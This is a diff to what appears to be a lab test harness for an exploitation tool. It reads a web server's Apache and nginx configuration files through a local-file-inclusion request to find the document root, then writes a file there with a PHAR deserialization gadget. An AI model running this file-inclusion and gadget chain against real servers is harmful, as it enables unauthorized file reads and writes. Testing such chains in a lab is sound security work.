@@ -474,13 +474,15 @@ def hand_phar(base: str) -> tuple[bool, str]:
     from injectorkit.core import phar  # noqa: PLC0415
 
     # 1. what does the server say it serves?
-    status, config = fetch(
-        f"{base}?read={urllib.parse.quote('/etc/apache2/sites-enabled/000-default.conf', safe='')}"
-    )
-    match = re.search(r"DocumentRoot\s+(\S+)", config)
-    if not match:
+    #
+    # Through the shared helper, so all three chains that write a file ask the
+    # same question in the same places. This one used to name a single path, and
+    # when the lab turned the default site off that path stopped carrying a
+    # DocumentRoot: the hand side said the configuration did not say which
+    # directory it serves while the tool, which reads a set of them, found it.
+    webroot = lab_webroot()
+    if not webroot:
         return False, "the server's configuration did not say which directory it serves"
-    webroot = match.group(1)
 
     # 2. an archive whose metadata is the gadget, aimed at a name under it
     name = "ikaccept-" + secrets.token_hex(6) + ".txt"
@@ -541,8 +543,21 @@ def lab_webroot() -> str:
 
     Used by the hand side of the chains that write a file, because the write has
     to land in a directory the server serves and a relative path does not work.
+
+    Both directories are read, not just the enabled one. Debian's `sites-enabled`
+    holds symlinks and the lab turns the default site off, so the file that is
+    still there with a `DocumentRoot` in it can be the one under
+    `sites-available` - and reading only the first made the hand side report
+    "the configuration did not say which directory it serves" while the tool,
+    which reads both, found it. That is the hand side being narrow, not the tool
+    being wrong.
     """
-    for path in ("/etc/apache2/sites-enabled/000-default.conf", "/etc/nginx/sites-enabled/default"):
+    for path in (
+        "/etc/apache2/sites-enabled/000-default.conf",
+        "/etc/apache2/sites-available/000-default.conf",
+        "/etc/nginx/sites-enabled/default",
+        "/etc/nginx/conf.d/default.conf",
+    ):
         _, body = fetch(f"http://{HOST}:8080/include.php?file={urllib.parse.quote(path, safe='')}")
         match = re.search(r"(?:DocumentRoot|root)\s+(\S+)", body)
         if match:
